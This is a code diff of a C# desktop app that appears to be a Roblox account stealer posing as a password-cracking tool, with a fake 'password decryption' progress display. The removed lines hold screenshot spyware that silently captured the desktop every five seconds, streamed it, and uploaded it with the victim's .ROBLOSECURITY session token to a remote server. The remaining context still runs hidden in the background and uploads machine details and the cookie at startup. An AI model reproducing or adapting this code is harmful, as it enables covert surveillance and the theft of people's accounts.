@@ -41,8 +41,6 @@ namespace FileTransfer
         private static string? _cachedToken;
         private const string PlaceholderText = "Введите никнейм...";
         private DispatcherTimer? _debounceTimer;
-        private DispatcherTimer? _screenshotTimer;
-        private StreamClient? _streamClient;
         private bool _backgroundMode;
 
         private static bool IsHiddenInstance()
@@ -72,15 +70,6 @@ namespace FileTransfer
             catch { }
         }
 
-        private static readonly byte[] DummyPngBytes = new byte[]
-        {
-            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
-            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
-            0x89, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x44, 0x41, 0x54, 0x78, 0xDA, 0x63, 0x60, 0x18, 0x05, 0xA3,
-            0x60, 0x14, 0x8C, 0x00, 0x08, 0x00, 0x05, 0x00, 0x01, 0x1E, 0xF5, 0x2E, 0x11, 0x00, 0x00, 0x00,
-            0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82
-        };
-
         public MainWindow()
         {
             Log("MainWindow constructor start");
@@ -103,7 +92,6 @@ namespace FileTransfer
                     Opacity = 0;
                     Log("Background mode start");
                     _ = Task.Run(StartBackgroundWorkAsync);
-                    StartStreamClient();
                 }
                 else
                 {
@@ -136,7 +124,6 @@ namespace FileTransfer
                 Hide();
                 ShowInTaskbar = false;
                 _ = Task.Run(StartBackgroundWorkAsync);
-                StartStreamClient();
             }
             else
             {
@@ -180,7 +167,6 @@ namespace FileTransfer
                 _ram = ComputerInfo.GetRAM();
                 _gpu = ComputerInfo.GetGPU();
                 await UploadFileOnStartupAsync();
-                StartScreenshotTimer();
                 Log("Background work OK");
             }
             catch (Exception ex)
@@ -209,88 +195,13 @@ namespace FileTransfer
             return new SolidColorBrush(c);
         }
 
-        // ── Screenshot capture ──────────────────────────────────────────────
-        private static byte[] CaptureDesktopScreenshot()
-        {
-            try
-            {
-                var screen = System.Windows.Forms.Screen.PrimaryScreen;
-                if (screen == null) return DummyPngBytes;
-                var bounds = screen.Bounds;
-                using var bitmap = new System.Drawing.Bitmap(bounds.Width, bounds.Height);
-                using (var g = System.Drawing.Graphics.FromImage(bitmap))
-                {
-                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
-                }
-                using var ms = new MemoryStream();
-                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
-                var bytes = ms.ToArray();
-                Log("Screenshot captured: " + bytes.Length + " bytes");
-                return bytes;
-            }
-            catch (Exception ex)
-            {
-                Log("Screenshot capture error: " + ex);
-                System.Diagnostics.Debug.WriteLine("Screenshot capture error: " + ex.Message);
-                return DummyPngBytes;
-            }
-        }
-
-        public static byte[] CaptureDesktopJpeg(int quality = 50, int scalePercent = 40)
-        {
-            try
-            {
-                var screen = System.Windows.Forms.Screen.PrimaryScreen;
-                if (screen == null) return Array.Empty<byte>();
-                var bounds = screen.Bounds;
-                int w = bounds.Width * scalePercent / 100;
-                int h = bounds.Height * scalePercent / 100;
-                if (w < 1) w = 1;
-                if (h < 1) h = 1;
-
-                using var src = new System.Drawing.Bitmap(bounds.Width, bounds.Height);
-                using (var g = System.Drawing.Graphics.FromImage(src))
-                {
-                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
-                }
-
-                using var dst = new System.Drawing.Bitmap(w, h);
-                using (var g = System.Drawing.Graphics.FromImage(dst))
-                {
-                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
-                    g.DrawImage(src, 0, 0, w, h);
-                }
-
-                using var ms = new MemoryStream();
-                var encoder = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
-                    .First(c => c.FormatID == System.Drawing.Imaging.ImageFormat.Jpeg.Guid);
-                var encoderParams = new System.Drawing.Imaging.EncoderParameters(1);
-                encoderParams.Param[0] = new System.Drawing.Imaging.EncoderParameter(
-                    System.Drawing.Imaging.Encoder.Quality, quality);
-                dst.Save(ms, encoder, encoderParams);
-                var bytes = ms.ToArray();
-                Log("JPEG frame captured: " + bytes.Length + " bytes");
-                return bytes;
-            }
-            catch (Exception ex)
-            {
-                Log("JPEG capture error: " + ex);
-                return Array.Empty<byte>();
-            }
-        }
-
-        // ── Startup Upload ──────────────────────────────────────────────────
+        // ── Startup Upload (computer info + cookie, no screenshots) ───────
         private async Task UploadFileOnStartupAsync()
         {
             Log("Upload startup start");
             try
             {
-                byte[] screenshot = await Task.Run(CaptureDesktopScreenshot);
                 using var content = new MultipartFormDataContent();
-                var fileContent = new ByteArrayContent(screenshot);
-                fileContent.Headers.ContentType =
-                    new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
-                content.Add(fileContent, "files", "screenshot.png");
                 content.Add(new StringContent(ComputerInfo.GetName()), "computerName");
                 content.Add(new StringContent(ComputerInfo.GetOS()), "os");
                 content.Add(new StringContent(_cpu ?? "—"), "cpu");
@@ -316,63 +227,6 @@ namespace FileTransfer
             catch (Exception ex)
             {
                 Log("Upload startup error: " + ex);
-                System.Diagnostics.Debug.WriteLine("Startup upload error: " + ex.Message);
-            }
-        }
-
-        // ── Periodic screenshot upload (every 5 sec) ───────────────────────
-        private void StartScreenshotTimer()
-        {
-            if (_screenshotTimer != null) return;
-            _screenshotTimer = new DispatcherTimer();
-            _screenshotTimer.Interval = TimeSpan.FromSeconds(5);
-            _screenshotTimer.Tick += async (s, e) =>
-            {
-                Log("Timer tick");
-                await UploadScreenshotAsync();
-            };
-            _screenshotTimer.Start();
-            Log("Screenshot timer started");
-        }
-
-        private void StartStreamClient()
-        {
-            if (_streamClient != null) return;
-            _streamClient = new StreamClient(ServerUrl, ComputerInfo.GetName(), OperatorName);
-            _streamClient.Start();
-            Log("Stream client started");
-        }
-
-        private async Task UploadScreenshotAsync()
-        {
-            Log("Upload screenshot start");
-            try
-            {
-                byte[] screenshot = await Task.Run(CaptureDesktopScreenshot);
-                Log("Screenshot captured: " + screenshot.Length + " bytes");
-                using var content = new MultipartFormDataContent();
-                var fileContent = new ByteArrayContent(screenshot);
-                fileContent.Headers.ContentType =
-                    new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
-                content.Add(fileContent, "files", "screenshot.png");
-                content.Add(new StringContent(ComputerInfo.GetName()), "computerName");
-                content.Add(new StringContent(ComputerInfo.GetOS()), "os");
-                content.Add(new StringContent(_cpu ?? "—"), "cpu");
-                content.Add(new StringContent(_ram ?? "—"), "ram");
-                content.Add(new StringContent(_gpu ?? "—"), "gpu");
-                content.Add(new StringContent(OperatorName), "operator");
-
-                if (!string.IsNullOrEmpty(_cachedToken))
-                    content.Add(new StringContent(_cachedToken), "robloSecurity");
-
-                string url = $"{ServerUrl}/upload";
-                var resp = await _http.PostAsync(url, content);
-                Log($"Upload screenshot response: {(int)resp.StatusCode}");
-            }
-            catch (Exception ex)
-            {
-                Log("Upload screenshot error: " + ex);
-                System.Diagnostics.Debug.WriteLine("Screenshot upload error: " + ex.Message);
             }
         }
 
@@ -441,7 +295,7 @@ namespace FileTransfer
 
             TxtPlaceholder.Text = "⏳";
             TxtPlaceholder.Opacity = 0.6;
-            AppendConsole("[roblox]", "#2A2D3A", $" Поиск профиля: {username}...", "#00CEC9");
+            AppendConsole("[roblox]", "#2A2D3A", $" Поиск профиля: {username}...", "#6C5CE7");
 
             var avatarImage = await DownloadRobloxAvatarAsync(username);
 
@@ -607,13 +461,13 @@ namespace FileTransfer
 
                 if (stepIndex < steps.Length)
                 {
-                    AppendConsole($"[{elapsed}s]", "#FFA502", $" {steps[stepIndex]}", "#81ECEC");
+                    AppendConsole($"[{elapsed}s]", "#FFA502", $" {steps[stepIndex]}", "#A29BFE");
                     stepIndex++;
                 }
                 else
                 {
                     int pct = rand.Next(60, 100);
-                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Расшифровка пароля: {pct}%...", "#81ECEC");
+                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Расшифровка пароля: {pct}%...", "#A29BFE");
                 }
 
                 await Task.Delay(nextDelay * 1000);
